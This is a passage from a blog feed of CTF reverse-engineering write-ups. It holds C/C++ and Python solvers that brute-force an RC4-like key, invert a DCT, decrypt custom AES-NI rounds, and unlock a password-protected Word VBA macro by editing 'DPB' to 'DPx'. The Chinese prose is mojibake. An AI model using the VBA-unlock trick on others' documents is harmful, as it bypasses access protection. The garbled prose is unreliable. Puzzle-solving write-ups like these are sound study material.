class="string">&#x27;0&#x27;</span>; i2 &lt;= <span class="string">&#x27;z&#x27;</span>; ++i2) &#123;</span><br><span class="line"><span class="keyword">if</span> (i2 &gt; <span class="string">&#x27;9&#x27;</span> &amp;&amp; i2 &lt; <span class="string">&#x27;a&#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">char</span> i3 = <span class="string">&#x27;0&#x27;</span>; i3 &lt;= <span class="string">&#x27;z&#x27;</span>; ++i3) &#123;</span><br><span class="line"><span class="keyword">if</span> (i3 &gt; <span class="string">&#x27;9&#x27;</span> &amp;&amp; i3 &lt; <span class="string">&#x27;a&#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">char</span> i4 = <span class="string">&#x27;0&#x27;</span>; i4 &lt;= <span class="string">&#x27;z&#x27;</span>; ++i4) &#123;</span><br><span class="line"><span class="keyword">if</span> (i4 &gt; <span class="string">&#x27;9&#x27;</span> &amp;&amp; i4 &lt; <span class="string">&#x27;a&#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">char</span> i5 = <span class="string">&#x27;0&#x27;</span>; i5 &lt;= <span class="string">&#x27;z&#x27;</span>; ++i5) &#123;</span><br><span class="line"><span class="keyword">if</span> (i5 &gt; <span class="string">&#x27;9&#x27;</span> &amp;&amp; i5 &lt; <span class="string">&#x27;a&#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line">buf = bak;</span><br><span class="line">std::vector&lt;<span class="type">int</span>&gt; combination = &#123; i1, i2, i3, i4, i5 &#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> xor_num = i2;</span><br><span class="line">std::vector&lt;<span class="type">int</span>&gt; S = <span class="built_in">init_permutation</span>(combination);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">buf[i] ^= xor_num;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, q = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (q &lt; <span class="number">4</span>) &#123;</span><br><span class="line">i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">j = (S[i] + j) % <span class="number">256</span>;</span><br><span class="line">std::<span class="built_in">swap</span>(S[i], S[j]);</span><br><span class="line">buf[q] ^= S[(S[i] + S[j]) % <span class="number">256</span>] ^ <span class="number">0x11</span>;</span><br><span class="line">++q;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((buf[<span class="number">0</span>] == <span class="number">0x89</span>) &amp;&amp; (buf[<span class="number">1</span>] == <span class="number">0x50</span>) &amp;&amp; (buf[<span class="number">2</span>] == <span class="number">0x4e</span>) &amp;&amp; (buf[<span class="number">3</span>] == <span class="number">0x47</span>)) &#123;</span><br><span class="line">std::cout &lt;&lt; i1 &lt;&lt; i2 &lt;&lt; i3 &lt;&lt; i4 &lt;&lt; i5 &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line"><span class="keyword">goto</span> A;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">A:</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;finished&quot;</span> &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>çˆ†å‡ºæ¥ä¹‹åç›´æ¥è§£å¯†</p><h3 id="ä½ è¿™ä¸»å‡½æ•°ä¿çœŸå—">ä½ è¿™ä¸»å‡½æ•°ä¿çœŸå—</h3><p>ç›´æ¥è°ƒè¯•,ç„¶åå°±æ˜¯åŸé¢˜</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dct3</span><span class="params">(<span class="type">const</span> std::vector&lt;<span class="type">double</span>&gt;&amp; Y, std::vector&lt;<span class="type">double</span>&gt;&amp; X)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> N = Y.<span class="built_in">size</span>();</span><br><span class="line">X.<span class="built_in">resize</span>(N);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> n = <span class="number">0</span>; n &lt; N; ++n) &#123;</span><br><span class="line"><span class="type">double</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; N; ++k) &#123;</span><br><span class="line"><span class="keyword">if</span> (k == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">sum += Y[k] * std::<span class="built_in">cos</span>(<span class="number">3.14159265</span> * k * (n + <span class="number">0.5</span>) / N) * std::<span class="built_in">sqrt</span>(<span class="number">1.0</span> / N);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">sum += Y[k] * std::<span class="built_in">cos</span>(<span class="number">3.14159265</span> * k * (n + <span class="number">0.5</span>) / N) * std::<span class="built_in">sqrt</span>(<span class="number">2.0</span> / N);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">X[n] = sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">std::vector&lt;<span class="type">double</span>&gt; res = &#123; <span class="number">513.355</span>, <span class="number">-37.7986</span>, <span class="number">8.7316</span>, <span class="number">-10.7832</span>, <span class="number">-1.3097</span>, <span class="number">-20.5779</span>,</span><br><span class="line"><span class="number">6.98641</span>, <span class="number">-29.2989</span>, <span class="number">15.9422</span>,<span class="number">21.4138</span>,<span class="number">29.4754</span>, <span class="number">-2.77161</span>,</span><br><span class="line"><span class="number">-6.58794</span>, <span class="number">-4.22332</span>, <span class="number">-7.20771</span>, <span class="number">8.83506</span>, <span class="number">-4.38138</span>, <span class="number">-19.3898</span>,</span><br><span class="line"><span class="number">18.3453</span>, <span class="number">6.88259</span>, <span class="number">-14.7652</span>, <span class="number">14.6102</span>, <span class="number">24.7414</span>, <span class="number">-11.6222</span>,</span><br><span class="line"><span class="number">-9.754759999999999</span>,<span class="number">12.2424</span>,<span class="number">13.4343</span>, <span class="number">-34.9307</span>, <span class="number">-35.735</span>,</span><br><span class="line"><span class="number">-20.0848</span>, <span class="number">39.689</span>, <span class="number">21.879</span>, <span class="number">26.8296</span> &#125;;</span><br><span class="line">std::vector&lt;<span class="type">double</span>&gt; X;</span><br><span class="line"><span class="built_in">dct3</span>(res, X);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">double</span> x : X) &#123;</span><br><span class="line">std::cout &lt;&lt; x &lt;&lt; <span class="string">&quot;,&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">33</span>; i++) &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> chr = (<span class="type">char</span>)std::<span class="built_in">round</span>(X[i]);</span><br><span class="line">std::cout &lt;&lt; chr;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æœ€årot13</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="doccrack">doccrack</h3><p>ç”¨7zè§£å‹</p><p>vbaProject.binä¸­æŠŠDPBæ”¹æˆDPxï¼Œç„¶åæ‰“å¼€wordçš„å®å¯ä»¥ç›´æ¥å¾—åˆ°æºä»£ç ã€‚</p><p>æŠŠä¸‹é¢æ‰§è¡Œçš„åœ°æ–¹åˆ é™¤ï¼Œè¿è¡Œå¾—åˆ°exeï¼Œç„¶åç›´æ¥é€†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line">data = [<span class="number">0x10C0</span>, <span class="number">0x1180</span>, <span class="number">0x1500</span>, <span class="number">0x1100</span>, <span class="number">0x14C0</span>, <span class="number">0x1040</span>, <span class="number">0x1F00</span>, <span class="number">0x1440</span>, <span class="number">0x1940</span>, <span class="number">0x1980</span>, <span class="number">0x1600</span>, <span class="number">0x0D80</span>, <span class="number">0x1D00</span>, <span class="number">0x1600</span>, <span class="number">0x18C0</span>, <span class="number">0x1980</span>, <span class="number">0x1A40</span>, <span class="number">0x1800</span>, <span class="number">0x1880</span>, <span class="number">0x1D40</span>, <span class="number">0x1A00</span>, <span class="number">0x1C80</span>, <span class="number">0x1D00</span>, <span class="number">0x0980</span>, <span class="number">0x0980</span>, <span class="number">0x0980</span>, <span class="number">0x1600</span>, <span class="number">0x1140</span>, <span class="number">0x0D80</span>, <span class="number">0x1C00</span>, <span class="number">0x1980</span>, <span class="number">0x1D40</span>, <span class="number">0x1880</span>, <span class="number">0x1600</span>, <span class="number">0x0DC0</span>, <span class="number">0x1840</span>, <span class="number">0x1600</span>, <span class="number">0x1280</span>, <span class="number">0x1980</span>, <span class="number">0x1900</span>, <span class="number">0x1D40</span>, <span class="number">0x0DC0</span>, <span class="number">0x1600</span>, <span class="number">0x1440</span>, <span class="number">0x0D80</span>, <span class="number">0x1D40</span>, <span class="number">0x1C80</span>, <span class="number">0x0C80</span>, <span class="number">0x1880</span>, <span class="number">0x1D00</span>, <span class="number">0x0980</span>, <span class="number">0x0980</span>, <span class="number">0x0980</span>, <span class="number">0x1E80</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    data[i]&gt;&gt;=<span class="number">6</span></span><br><span class="line">pxor(data,<span class="number">7</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> é¢˜é›† </category>
          
          <category> CTF </category>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sekaictf2024å¤ç°</title>
      <link href="/posts/925c7fa6.html"/>
      <url>/posts/925c7fa6.html</url>
      
        <content type="html"><![CDATA[<p>åªåšäº†ä¸€ä¸ªï¼Œä¹‹åå†å¤ç°å…¶å®ƒçš„</p><h2 id="x64extenshion">x64extenshion</h2><p>ç”¨æŒ‡ä»¤é›†è‡ªå†™äº†ä¸€ä¸ªaes</p><p>å…ˆåŠ¨æ€è°ƒè¯•å‡ºåŠ å¯†çš„è½®å¯†é’¥ï¼Œç„¶åç®—å‡ºè§£å¯†å¯†é’¥ç›´æ¥å‡º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;wmmintrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">aes_encrypt_array</span><span class="params">(__m128i* data, <span class="type">int</span> num_elements, __m128i* rkeys)</span> &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> key1[] = &#123; <span class="number">0xFF</span>, <span class="number">0xFE</span>, <span class="number">0xFD</span>, <span class="number">0xFC</span>, <span class="number">0xFB</span>, <span class="number">0xFA</span>, <span class="number">0xF9</span>, <span class="number">0xF8</span>, <span class="number">0xF7</span>, <span class="number">0xF6</span>, <span class="number">0xF5</span>, <span class="number">0xF4</span>, <span class="number">0xF3</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xF0</span> &#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> key2[] = &#123; <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0x0D</span>, <span class="number">0x0E</span>, <span class="number">0x0F</span> &#125;;</span><br><span class="line"></span><br><span class="line">__m128i key1_m128i = _mm_loadu_si128((__m128i*)key1);</span><br><span class="line">__m128i key2_m128i = _mm_loadu_si128((__m128i*)key2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> index = <span class="number">0</span>; index &lt; num_elements; ++index) &#123;</span><br><span class="line">__m128i state = _mm_loadu_si128(&amp;data[index]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (index == <span class="number">0</span>) &#123;</span><br><span class="line">state = _mm_xor_si128(state, _mm_xor_si128(key1_m128i, key2_m128i));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">__m128i previous_encrypted = _mm_loadu_si128(&amp;data[index - <span class="number">1</span>]);</span><br><span class="line">state = _mm_xor_si128(state, _mm_xor_si128(previous_encrypted, key2_m128i));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">13</span>; ++i) &#123;</span><br><span class="line">state = _mm_aesenc_si128(state, rkeys[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">state = _mm_aesenclast_si128(state, rkeys[<span class="number">13</span>]);</span><br><span class="line"></span><br><span class="line">_mm_storeu_si128(&amp;data[index], state);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">aes_decrypt_array</span><span class="params">(__m128i* data, <span class="type">int</span> num_elements, __m128i* rkeys)</span> &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> key1[] = &#123; <span class="number">0xFF</span>, <span class="number">0xFE</span>, <span class="number">0xFD</span>, <span class="number">0xFC</span>, <span class="number">0xFB</span>, <span class="number">0xFA</span>, <span class="number">0xF9</span>, <span class="number">0xF8</span>, <span class="number">0xF7</span>, <span class="number">0xF6</span>, <span class="number">0xF5</span>, <span class="number">0xF4</span>, <span class="number">0xF3</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xF0</span> &#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> key2[] = &#123; <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0x0D</span>, <span class="number">0x0E</span>, <span class="number">0x0F</span> &#125;;</span><br><span class="line"></span><br><span class="line">__m128i key1_m128i = _mm_loadu_si128((__m128i*)key1);</span><br><span class="line">__m128i key2_m128i = _mm_loadu_si128((__m128i*)key2);</span><br><span class="line">__m128i initial_key = _mm_xor_si128(key1_m128i, key2_m128i);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> index = num_elements - <span class="number">1</span>; index &gt;= <span class="number">0</span>; --index) &#123;</span><br><span class="line">__m128i state = _mm_loadu_si128(&amp;data[index]);</span><br><span class="line">state = _mm_xor_si128(state, rkeys[<span class="number">13</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">12</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">state = _mm_aesdec_si128(state, rkeys[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (index == <span class="number">0</span>) &#123;</span><br><span class="line">state = _mm_aesdeclast_si128(state, initial_key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">__m128i previous_encrypted = _mm_loadu_si128(&amp;data[index - <span class="number">1</span>]);</span><br><span class="line">__m128i temp_key = _mm_xor_si128(previous_encrypted, key2_m128i);</span><br><span class="line">state = _mm_aesdeclast_si128(state, temp_key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_mm_storeu_si128(&amp;data[index], state);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">generateDecryptionKeys</span><span class="params">(<span class="type">const</span> __m128i* encryptionKeys, __m128i* decryptionKeys, <span class="type">int</span> nr)</span> &#123;</span><br><span class="line">decryptionKeys[nr - <span class="number">1</span>] = encryptionKeys[nr - <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nr - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">decryptionKeys[i] = _mm_aesimc_si128(encryptionKeys[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> ciphers[] = &#123; <span class="number">0x15</span>,<span class="number">0x2a</span>,<span class="number">0x38</span>,<span class="number">0x82</span>,<span class="number">0xcd</span>,<span class="number">0x8a</span>,<span class="number">0x36</span>,<span class="number">0x33</span>,<span class="number">0x54</span>,<span class="number">0x4d</span>,<span class="number">0x22</span>,<span class="number">0x66</span>,<span class="number">0x5c</span>,<span class="number">0xe5</span>,<span class="number">0x8a</span>,<span class="number">0xea</span>,<span class="number">0x1c</span>,<span class="number">0xb2</span>,<span class="number">0x5d</span>,<span class="number">0xb2</span>,<span class="number">0x59</span>,<span class="number">0x64</span>,<span class="number">0x7a</span>,<span class="number">0x7e</span>,<span class="number">0x6d</span>,<span class="number">0x70</span>,<span class="number">0x21</span>,<span class="number">0x2a</span>,<span class="number">0xdd</span>,<span class="number">0x24</span>,<span class="number">0x6b</span>,<span class="number">0x8e</span>,<span class="number">0x38</span>,<span class="number">0x11</span>,<span class="number">0x45</span>,<span class="number">0xa3</span>,<span class="number">0x60</span>,<span class="number">0x3d</span>,<span class="number">0xca</span>,<span class="number">0x8f</span>,<span class="number">0x12</span>,<span class="number">0xb6</span>,<span class="number">0xec</span>,<span class="number">0x9c</span>,<span class="number">0x0f</span>,<span class="number">0x60</span>,<span class="number">0xd9</span>,<span class="number">0x26</span>,<span class="number">0xe9</span>,<span class="number">0x2c</span>,<span class="number">0x83</span>,<span class="number">0x9f</span>,<span class="number">0x61</span>,<span class="number">0x70</span>,<span class="number">0x0f</span>,<span class="number">0xdc</span>,<span class="number">0x78</span>,<span class="number">0x92</span>,<span class="number">0x59</span>,<span class="number">0x39</span>,<span class="number">0x48</span>,<span class="number">0xc1</span>,<span class="number">0xe7</span>,<span class="number">0xc2</span>,<span class="number">0x6b</span>,<span class="number">0x5c</span>,<span class="number">0xba</span>,<span class="number">0x1c</span>,<span class="number">0x43</span>,<span class="number">0xc2</span>,<span class="number">0x86</span>,<span class="number">0x80</span>,<span class="number">0x18</span>,<span class="number">0x62</span>,<span class="number">0x15</span>,<span class="number">0xd2</span>,<span class="number">0x1e</span>,<span class="number">0x0b</span>,<span class="number">0x6b</span>,<span class="number">0x9e</span>,<span class="number">0x17</span>,<span class="number">0x2c</span>,<span class="number">0x14</span>,<span class="number">0xc7</span>,<span class="number">0x41</span>,<span class="number">0x10</span>,<span class="number">0xc4</span>,<span class="number">0x35</span>,<span class="number">0xfe</span>,<span class="number">0x78</span>,<span class="number">0x6f</span>,<span class="number">0xb4</span>,<span class="number">0xfc</span>,<span class="number">0xdd</span>,<span class="number">0xd4</span>,<span class="number">0xaa</span>,<span class="number">0xba</span>,<span class="number">0xdd</span>,<span class="number">0xaa</span>,<span class="number">0x15</span>,<span class="number">0x02</span>,<span class="number">0xb7</span>,<span class="number">0xf7</span>,<span class="number">0x77</span>,<span class="number">0x65</span>,<span class="number">0x43</span>,<span class="number">0xf3</span>,<span class="number">0x78</span>,<span class="number">0xcc</span>,<span class="number">0xee</span>,<span class="number">0x14</span>,<span class="number">0xca</span>,<span class="number">0x53</span>,<span class="number">0x42</span>,<span class="number">0xdf</span>,<span class="number">0x3a</span>,<span class="number">0xec</span>,<span class="number">0xed</span>,<span class="number">0xa6</span>,<span class="number">0x31</span>,<span class="number">0x4a</span>,<span class="number">0x81</span>,<span class="number">0x4d</span>,<span class="number">0xff</span>,<span class="number">0xbe</span>,<span class="number">0x4e</span>,<span class="number">0xc6</span>,<span class="number">0xef</span>,<span class="number">0x17</span>,<span class="number">0x68</span>,<span class="number">0xd0</span>,<span class="number">0x9d</span>,<span class="number">0xb1</span>,<span class="number">0x73</span>,<span class="number">0xff</span>,<span class="number">0x4e</span>,<span class="number">0x24</span>,<span class="number">0xbf</span>,<span class="number">0xec</span>,<span class="number">0xbb</span>,<span class="number">0x55</span>,<span class="number">0xf5</span>,<span class="number">0xaf</span>,<span class="number">0x7d</span>,<span class="number">0x7d</span>,<span class="number">0x6b</span>,<span class="number">0xdf</span>,<span class="number">0x9f</span>,<span class="number">0x9a</span>,<span class="number">0x3b</span>,<span class="number">0x23</span>,<span class="number">0x98</span>,<span class="number">0xb3</span>,<span class="number">0xa4</span>,<span class="number">0xb4</span>,<span class="number">0x1c</span>,<span class="number">0x26</span>,<span class="number">0x5f</span>,<span class="number">0x7a</span>,<span class="number">0x0d</span> &#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> rkeys[] = &#123; <span class="number">0x10</span>, <span class="number">0x11</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x14</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x17</span>, <span class="number">0x18</span>, <span class="number">0x19</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x1C</span>, <span class="number">0x1D</span>, <span class="number">0x1E</span>, <span class="number">0x1F</span>,</span><br><span class="line"><span class="number">0xB7</span>, <span class="number">0x73</span>, <span class="number">0xC2</span>, <span class="number">0x9F</span>, <span class="number">0xB3</span>, <span class="number">0x76</span>, <span class="number">0xC4</span>, <span class="number">0x98</span>, <span class="number">0xBB</span>, <span class="number">0x7F</span>, <span class="number">0xCE</span>, <span class="number">0x93</span>, <span class="number">0xB7</span>, <span class="number">0x72</span>, <span class="number">0xC0</span>, <span class="number">0x9C</span>,</span><br><span class="line"><span class="number">0xB9</span>, <span class="number">0x51</span>, <span class="number">0xA8</span>, <span class="number">0xCD</span>, <span class="number">0xAD</span>, <span class="number">0x44</span>, <span class="number">0xBE</span>, <span class="number">0xDA</span>, <span class="number">0xB5</span>, <span class="number">0x5D</span>, <span class="number">0xA4</span>, <span class="number">0xC1</span>, <span class="number">0xA9</span>, <span class="number">0x40</span>, <span class="number">0xBA</span>, <span class="number">0xDE</span>,</span><br><span class="line"><span class="number">0x8D</span>, <span class="number">0x87</span>, <span class="number">0xDF</span>, <span class="number">0x4C</span>, <span class="number">0x3E</span>, <span class="number">0xF1</span>, <span class="number">0x1B</span>, <span class="number">0xD4</span>, <span class="number">0x85</span>, <span class="number">0x8E</span>, <span class="number">0xD5</span>, <span class="number">0x47</span>, <span class="number">0x32</span>, <span class="number">0xFC</span>, <span class="number">0x15</span>, <span class="number">0xDB</span>,</span><br><span class="line"><span class="number">0x9A</span>, <span class="number">0xE1</span>, <span class="number">0xF1</span>, <span class="number">0x74</span>, <span class="number">0x37</span>, <span class="number">0xA5</span>, <span class="number">0x4F</span>, <span class="number">0xAE</span>, <span class="number">0x82</span>, <span class="number">0xF8</span>, <span class="number">0xEB</span>, <span class="number">0x6F</span>, <span class="number">0x2B</span>, <span class="number">0xB8</span>, <span class="number">0x51</span>, <span class="number">0xB1</span>,</span><br><span class="line"><span class="number">0xD6</span>, <span class="number">0x56</span>, <span class="number">0x17</span>, <span class="number">0xBD</span>, <span class="number">0xE8</span>, <span class="number">0xA7</span>, <span class="number">0x0C</span>, <span class="number">0x69</span>, <span class="number">0x6D</span>, <span class="number">0x29</span>, <span class="number">0xD9</span>, <span class="number">0x2E</span>, <span class="number">0x5F</span>, <span class="number">0xD5</span>, <span class="number">0xCC</span>, <span class="number">0xF5</span>,</span><br><span class="line"><span class="number">0x55</span>, <span class="number">0xE2</span>, <span class="number">0xBA</span>, <span class="number">0x92</span>, <span class="number">0x62</span>, <span class="number">0x47</span>, <span class="number">0xF5</span>, <span class="number">0x3C</span>, <span class="number">0xE0</span>, <span class="number">0xBF</span>, <span class="number">0x1E</span>, <span class="number">0x53</span>, <span class="number">0xCB</span>, <span class="number">0x07</span>, <span class="number">0x4F</span>, <span class="number">0xE2</span>,</span><br><span class="line"><span class="number">0xA9</span>, <span class="number">0xD2</span>, <span class="number">0x8F</span>, <span class="number">0xA2</span>, <span class="number">0x41</span>, <span class="number">0x75</span>, <span class="number">0x83</span>, <span class="number">0xCB</span>, <span class="number">0x2C</span>, <span class="number">0x5C</span>, <span class="number">0x5A</span>, <span class="number">0xE5</span>, <span class="number">0x73</span>, <span class="number">0x89</span>, <span class="number">0x96</span>, <span class="number">0x10</span>,</span><br><span class="line"><span class="number">0xDA</span>, <span class="number">0x45</span>, <span class="number">0x2A</span>, <span class="number">0x58</span>, <span class="number">0xB8</span>, <span class="number">0x02</span>, <span class="number">0xDF</span>, <span class="number">0x64</span>, <span class="number">0x58</span>, <span class="number">0xBD</span>, <span class="number">0xC1</span>, <span class="number">0x37</span>, <span class="number">0x93</span>, <span class="number">0xBA</span>, <span class="number">0x8E</span>, <span class="number">0xD5</span>,</span><br><span class="line"><span class="number">0x87</span>, <span class="number">0xCB</span>, <span class="number">0x8C</span>, <span class="number">0x7E</span>, <span class="number">0xC6</span>, <span class="number">0xBE</span>, <span class="number">0x0F</span>, <span class="number">0xB5</span>, <span 